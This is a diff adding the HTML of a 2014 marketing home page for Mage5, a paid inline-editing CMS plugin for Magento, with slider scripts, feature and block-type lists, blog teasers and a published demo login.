+    $jq(document).ready(function(){
+
+        //$jqstatus = $jq(".status");
+
+        var options = {
+
+            autoPlay: true,
+
+            autoPlayDelay: 5000,
+
+            pauseOnHover: false, 
+
+            hidePreloaderDelay: 500,
+
+            nextButton: true,
+
+            prevButton: true,
+
+            pauseButton: true,
+
+            preloader: true,
+
+            pagination:true,
+
+            hidePreloaderUsingCSS: false,                   
+
+            animateStartingFrameIn: true,    
+
+            navigationSkipThreshold: 750,
+
+            preventDelayWhenReversingAnimations: true,
+
+            customKeyEvents: {
+
+                80: "pause"
+
+            }
+
+        };
+
+
+
+        var sequence = $jq("#sequence").sequence(options).data("sequence");
+
+
+
+           
+
+    });
+
+    //]]>
+
+
+
+</script> 
+
+							
+								
+						</div>
+						<div class="col-md-4 col-sm-12 col-sms-12">
+														
+							
+							<div class="ma-banner-2">
+<div class="box-col box-col-1">
+<div class="box-content"><a href="/demo/admin" target="_blank"><img src="http://www.mage5.com/media/cd.jpg" alt="Mage5 Demo" /></a>
+<div class="box-title">
+<h3>TRY DEMO</h3>
+<p>User: demo   Pwd : Demo001</p>
+</div>
+</div>
+</div>
+<div class="box-col box-col-2">
+<div class="box-content"><a href="/contacts"><img src="http://www.mage5.com/media/SAM.jpg" alt="Contact us" /></a>
+<div class="box-title">
+<h3>Contact Us for a Quote</h3>
+<p>Yes!! you are going to be a fan of Mage5</p>
+</div>
+</div>
+</div>
+</div>							
+							
+						</div>
+					</div>
+				</div>
+			</div> 
+			
+			<div class="main-container col2-left-layout">
+				<div class="container">
+					<div class="container-inner">
+						<div class="main">
+														<div class="row">
+								<div class="col-left sidebar col-lg-3 col-md-3 col-sm-12 col-xs-12">
+								
+								
+								
+								
+																
+								<div class="ma-banner-left ">
+<div class="ma-block-static-inner"><a href="http://www.mage5.com/index.php/mage5-cms-plugin-for-magento.html?___store=en"><img src="http://www.mage5.com/media/BANNERLEFT.jpg" alt=""></a>
+<h1 style="text-align: center;"><a title="Mage5 CMS Plugin For Magento" href="http://www.mage5.com/index.php/mage5-cms-plugin-for-magento.html?___store=en"><span style="color: #ff00ff;">99 Dollar Only, Order now</span></a></h1>
+</div>
+</div><p></p>
+<iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2Fpages%2FMage5%2F731258380272878&width=265&height=290&colorscheme=light&show_faces=true&header=true&stream=false&show_border=true" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:265px; height:290px;" allowTransparency="true"></iframe>
+<p></p><a class="twitter-timeline" data-dnt="true" href="https://twitter.com/mage5cms" data-widget-id="506113122076090368">Tweets by @mage5cms</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>								
+								</div>
+								<div class="col-main col-lg-9 col-md-9 col-sm-12 col-xs-12">
+																											
+									
+									<div class="std">
+  <div class="home-content">
+    
+     <div class="page-title">
+        <h1>Why I need Mage5 In My Store</h1>
+    </div>
+<div class="std">
+	
+	<p>Mage5 framework help you edit your site inline and it is very flexible framework for your developers to make custom theme, block types and connecting admin package with Mage5 Block types. More over it reduces the magento development skinning time. Once your site is live, site owners can easily change images/contents (CMS) very easily using the powerful Mage5 inline editing framework.</p>
+</div>	
+  </div>
+</div>
+
+<div class="page-title">
+        <h1>Included block types</h1>
+    </div>
+<ul class='listitem clearfix'> 		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/autonav/thumbnail.png" alt="Mage5 Auto-Nav" title="Mage5 Auto-Nav" />
+     <p class="code">Auto-Nav</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/content/thumbnail.png" alt="Mage5 Content" title="Mage5 Content" />
+     <p class="code">Content</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/file/thumbnail.png" alt="Mage5 File Download" title="Mage5 File Download" />
+     <p class="code">File Download</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/flash/thumbnail.png" alt="Mage5 Flash Content" title="Mage5 Flash Content" />
+     <p class="code">Flash Content</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/form/thumbnail.png" alt="Mage5 Form" title="Mage5 Form" />
+     <p class="code">Form</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/image/thumbnail.png" alt="Mage5 Image" title="Mage5 Image" />
+     <p class="code">Image</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/productlist/thumbnail.png" alt="Mage5 Product lists" title="Mage5 Product lists" />
+     <p class="code">Product lists</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/slideshow/thumbnail.png" alt="Mage5 Slideshow" title="Mage5 Slideshow" />
+     <p class="code">Slideshow</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/youtube/thumbnail.png" alt="Mage5 Youtube Video" title="Mage5 Youtube Video" />
+     <p class="code">Youtube Video</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/blocks/quickcontent/thumbnail.png" alt="Mage5 Quick Content" title="Mage5 Quick Content" />
+     <p class="code">Quick Content</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/html/thumbnail.png" alt="Mage5 HTML" title="Mage5 HTML" />
+     <p class="code">HTML</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/sociallinks/thumbnail.png" alt="Mage5 Social Icons" title="Mage5 Social Icons" />
+     <p class="code">Social Icons</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/staticblock/thumbnail.png" alt="Mage5 Static Blocks" title="Mage5 Static Blocks" />
+     <p class="code">Static Blocks</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/rssdisplayer/thumbnail.png" alt="Mage5 RSS Displayer" title="Mage5 RSS Displayer" />
+     <p class="code">RSS Displayer</p>
+    </div></li>
+ 		 
+ 		 
+ 		  		 
+ 		 <li class="move col-sm-3 col-xs-4" style="text-align:center;">
+         <div class="apps clearfix">   
+    <img src="http://www.mage5.com/magefive1.0.0/core/blocks/googlemap/thumbnail.png" alt="Mage5 GoogleMap" title="Mage5 GoogleMap" />
+     <p class="code">GoogleMap</p>
+    </div></li>
+ 		 
+ 		 
+ 		 </ul><div class="std">
+  <div class="home-content">
+    
+     <div class="page-title">
+        <h1>Features of Mage5</h1>
+    </div>
+<div class="std">
+	
+	<p>Mage5 is easy for site owners to use, flexible for developers to work with, and ready for Community/Go and Enterprise Ready.</p>
+<p>Some of many features include:</p>
+<ul>
+<li>WYSIWYG text editor</li>
+<li>In-context editing toolbar – change your website as you surf!</li>
+<li>Automatic navigations – add a page anywhere and it's updated everywhere</li>
+<li>File manager with bulk upload</li>
+<li>Drag-n-Drop content around your pages</li>
+<li>An open marketplace of add-ons and themes</li>
+<li>Out of the box includes a photo slide show, You Tube integration, Flash support, search, RSS, secure file distribution,Google Maps, and a form generation tool</li>
+</ul>
+</div>	
+  </div>
+</div>
+
+<div style="margin-top:30px;"></div>
+<div class="videowrapper">
+<iframe width="770" height="470" src="https://www.youtube.com/embed/pF4gJcZNrmE?autohide=1" frameborder="0" allowfullscreen></iframe>
+</div>									
+									
+									
+								</div>
+							</div>
+						</div>
+					</div>	
+				</div>		
+			</div>
+			
+			
+			
+			
+				
+			
+			
+			
+			
+			
+			</div>
+			
+						
+							<div class="ma-blog-slider">
+		<div class="container">
+			<script>
+	$jq(document).ready(function(){
+		$jq('.menu-recent .bxslider').bxSlider({
+			minSlides: 4,
+			maxSlides: 4,
+			slideWidth: 1140,
+			slideMargin: 30,
+			auto: false,
+			autoControls: false,
+			pager: false,
+			mode: 'horizontal',
+			speed: 1000,
+			prevText: '<',
+			nextText: '>',
+			pause: 4000,
+			//easing: 'jswing',
+			autoHover: true,
+			moveSlides:2
+		});
+	});
+</script>
+	<div class="menu-recent">
+		<div class="blog-title ma-title"><h2>Latest Blog</h2></div>
+		<ul class="bxslider">
+									<li>
+					<img  width="270px" height="130px"  src="http://www.mage5.com/media/magentothem/blog/Mage5_Mage5_CMS_Solution_for_Magento_Store_Mage5__2_1.png">					<div class="blog-content">
+						 <a href="http://www.mage5.com/index.php/blog/how-to-make-mage5-block-type/" ><h3 class="ma-title1">How to create your own mage5 Block type</h3></a> 												<div class="blog_down">
+						<div class="timmer"><span class="day">01</span><span class="month">Sep</span><span class="year">2014</span></div></div>						<p><span>Creating a block in Mage5 is very eazy, please note that...						 <p><a href="http://www.mage5.com/index.php/blog/how-to-make-mage5-block-type/">Read more >></a></p> 					</div>
+				</li>
+							<li>
+					<img  width="270px" height="130px"  src="http://www.mage5.com/media/magentothem/blog/Mage5_Mage5_CMS_Solution_for_Magento_Store_Mage5__2.png">					<div class="blog-content">
+						 <a href="http://www.mage5.com/index.php/blog/cheetsheet/" ><h3 class="ma-title1">Cheat Sheet</h3></a> 												<div class="blog_down">
+						<div class="timmer"><span class="day">01</span><span class="month">Sep</span><span class="year">2014</span></div></div>						<p>All about mage5 programming. Its a place for getting code snippets...						 <p><a href="http://www.mage5.com/index.php/blog/cheetsheet/">Read more >></a></p> 					</div>
+				</li>
+							<li>
+					<img  width="270px" height="130px"  src="http://www.mage5.com/media/magentothem/blog/Mage5_Mage5_CMS_Solution_for_Magento_Store_Mage5__3.png">					<div class="blog-content">
+						 <a href="http://www.mage5.com/index.php/blog/how-to-install-mage5-framework/" ><h3 class="ma-title1">How to Install Mage5</h3></a> 												<div class="blog_down">
+						<div class="timmer"><span class="day">01</span><span class="month">Sep</span><span class="year">2014</span></div></div>						<p>We will explain you how to install mage5 over current running...						 <p><a href="http://www.mage5.com/index.php/blog/how-to-install-mage5-framework/">Read more >></a></p> 					</div>
+				</li>
+							<li>
+					<img  width="270px" height="130px"  src="http://www.mage5.com/media/magentothem/blog/Mage5_Mage5_CMS_Solution_for_Magento_Store_Mage5__1.png">					<div class="blog-content">
+						 <a href="http://www.mage5.com/index.php/blog/mage5-framework/" ><h3 class="ma-title1">Welcome to Mage5 Frameowrk</h3></a> 												<div class="blog_down">
+						<div class="timmer"><span class="day">01</span><span class="month">Sep</span><span class="year">2014</span></div></div>						<p>Mage5 is easy for site owners to use, flexible for developers to...						 <p><a href="http://www.mage5.com/index.php/blog/mage5-framework/">Read more >></a></p> 					</div>
+				</li>
+							</ul>
+	</div>
+		</div>	
+	</div>
+			<div class="ma-brand-slider-contain">
+    <div class="container">
+	<div class="container-inner">
+    	<div class="brand-title ma-title"><h2>BRAND &amp; CLIENTS</h2></div>
+          	<ul class="bxslider">
+				                    <li class="item">						    														<div class="item-inner">																				    							<a href="#" title=""><img src="http://www.mage5.com/media/magentothem/brandslider/black.png" alt="" /></a>												
+																																							             
+                        						</div>
+                    </li>
+				                    <li class="item">						    														<div class="item-inner">																				    							<a href="#" title=""><img src="http://www.mage5.com/media/magentothem/brandslider/lg.png" alt="" /></a>												
+																																							             
+                        						</div>
+                    </li>
+				                    <li class="item">						    														<div class="item-inner">																				    							<a href="#" title=""><img src="http://www.mage5.com/media/magentothem/brandslider/samsung.png" alt="" /></a>												
+																																							             
+                        						</div>
+                    </li>
+				                    <li class="item">						    														<div class="item-inner">																				    							<a href="#" title=""><img src="http://www.mage5.com/media/magentothem/brandslider/vaio.png" alt="" /></a>												
+																																							             
+                        						</div>
+                    </li>
+				                    <li class="item">						    														<div class="item-inner">																				    							<img src="http://www.mage5.com/media/magentothem/brandslider/htc.png" alt="" />
+																																							             
+                        						</div>
+                    </li>
+				            </ul>
+            <script type="text/javascript">
+			       //<![CDATA[
+					$jq(document).ready(function(){
+					  $jq('.ma-brand-slider-contain .bxslider').bxSlider(
+						{
+												  speed: 1000,
+						  pause: 300,			  
+						  minSlides: 1,
+						  maxSlides: 6,
+						  slideWidth: 152,
+						  slideMargin: 50,
+					      
+						  pager:false, 
+																			controls: true,
+												moveSlides:2,
+						}
+					  );
+					});
+				//]]>
+				</script>
+	</div>
+    </div>				
+</div> 			<div class="ma-block-link-follow">
+	<div class="container">
+		<div class="block-link-follow">
+			<div class="row">
+				<div class="f-col f-col-2 col-sm-12 col-md-7 col-sms-12"><div class="block-subscribe">
+	<div class="subscribe-title ">
+        <h3>Newsletter</h3>
+		<label for="newsletter">Sign Up for Our Newsletter:</label>
+    </div>
+    <form action="http://www.mage5.com/index.php/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+        <div class="subscribe-content">
+			<div class="actions">
+                <button type="submit" title="Subscribe" class="button"><span><span>Subscribe</span></span></button>
+            </div>
+            <div class="input-box">
+               <input type="text" name="email" id="newsletter" title="Sign up for our newsletter" class="input-text required-entry validate-email" />
+            </div>
+            
+        </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+</div>
+<div class="f-col f-col-1 col-sm-12 col-md-5 col-sms-12">
+<ul class="link-follow">
+<li class="first"><a class="facebook fa fa-facebook" href="https://www.facebook.com/pages/Mage5/731258380272878" target="_blank"><span>facebook</span></a></li>
+<li><a class="youtube fa fa-youtube" href="https://www.youtube.com/watch?v=pF4gJcZNrmE&amp;list=UUkRrl80kbl1nwy1rAKWB1lQ" target="_blank"><span>Youtube</span></a></li>
+<li><a class="twitter fa fa-twitter" href="https://twitter.com/mage5cms" target="_blank"><span>twitter</span></a></li>
+
+<li><a class="linkedin fa fa-linkedin" href="https://www.linkedin.com/company/mage5-cms-for-magento" target="_blank"><span>linkedin</span></a></li>
+</ul>
+</div>			</div>
+		</div>
+	</div>
+</div>
+			
+			<div class="ma-footer-static">
+	<div class="container">
+		<div class="footer-static">
+						
+			
+			
+			<div class="row">
+			
+			
+				
+<div class="f-col f-col-4 col-sm-6 col-md-3 col-sms-6 col-smb-12">
+<div class="footer-static-title">
+<h3>About Us</h3>
+</div>
+<div class="footer-static-content">
+<ul>
+<li class="first"><a title="About Us" href="http://www.mage5.com/index.php/about-mage5">About us</a></li>
+<li><a href="http://www.mage5.com/index.php/sales/order/history/">Order History</a></li>
+<li><a>Returns</a></li>
+<li><a>Custom Service</a></li>
+<li class="last"><a>Terms &amp; Condition</a></li>
+</ul>
+</div></div>
+<div class="f-col f-col-5 col-sm-6 col-md-3 col-sms-6 col-smb-12">
+<div class="footer-static-title">
+<h3>OUR SUPPORT</h3>
+</div>
+<div class="footer-static-content">
+<ul>
+<li class="first"><a href="#">Sitemap</a></li>
+<li><a href="#">Privacy Policy</a></li>
+<li><a href="#">Your Account</a></li>
+<li><a href="#">Advanced Search</a></li>
+<li class="last"><a href="#">Contact Us</a></li>
+</ul>
+</div></div>
+<div class="f-col f-col-6 col-sm-6 col-md-3 col-sms-6 col-smb-12">
+<div class="footer-static-title">
+<h3>MY ACCOUNT</h3>
+</div>
+<div class="footer-static-content">
+<ul>
+<li class="first"><a href="/customer/account/index">My Account</a></li>
+<li><a href="/contacts">Order History</a></li>
+<li><a href="/contacts">Returns</a></li>
+<li><a href="/contacts">Specials</a></li>
+<li class="last"><a href="/catalog/seo_sitemap/category">Site Map</a></li>
+</ul>
+</div></div>
+<div class="f-col f-col-7 col-sm-6 col-md-3 col-sms-6 col-smb-12">
+<div class="footer-static-title">
+<h3>INFORMATION</h3>
+</div>
+<div class="footer-static-content">
+<ul>
+<li class="first"><a>About us</a></li>
+<li><a>Delivery Information</a></li>
+<li><a>Privacy Policy</a></li>
+<li><a>Custom Service</a></li>
+<li class="last"><a>Terms &amp; Condition</a></li>
+</ul>
+</div></div>			
+
+
+
+</div>
+			
+			
+			
+			
+			
+			
+		</div>	
+	</div>	
+</div>
+<div class="ma-footer">
+	<div class="container">
+		<div class="footer">
+			<div class="row">
+				<div class="col-xs-12 col-sm-6">
+					<address>Copyright &copy; 2014 <a href="http://www.revolve314.com/" target="_blank" title="Responsive web Coding Using Concrete5 ">Revolve314 Digital Solution</a>. All Rights Reserved</address>
+				</div>
+				<div class="col-xs-12 col-sm-6">
+										
+			
+				<ul class="payment">
+				<li><a href="#"><img src="http://www.mage5.com/media/wysiwyg/payment.png" alt="" /></a></li>
+				</ul>
+		    
+            				</div>
+			</div>
+			<div id="back-top" class="hidden-xs"></div>
+		</div>
+	</div>	
+</div>
+						
+
+    </div>
+</div>
+</body>
+</html>
